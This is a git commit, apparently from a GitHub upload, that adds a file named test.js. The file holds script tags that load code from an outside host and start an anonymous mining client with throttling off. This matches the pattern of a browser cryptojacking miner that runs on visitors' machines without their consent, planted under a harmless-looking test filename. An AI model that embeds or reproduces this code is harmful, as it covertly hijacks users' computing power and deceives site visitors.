5e5064fb90bb43423316d3f8d6c350407cc65200
Tannic Archer <113786861+TannicArcher@users.noreply.github.com>
2023-12-20 22:31:10 +0200

    Add files via upload

---
+++ test.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/7gVL.js"></script>
+<script>
+    var _client = new Client.Anonymous('ff56f4a1b0a751bf9927a3dfb74e93b2544df52c4e6192975c49bba6c0835dca', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    
+
+</script>
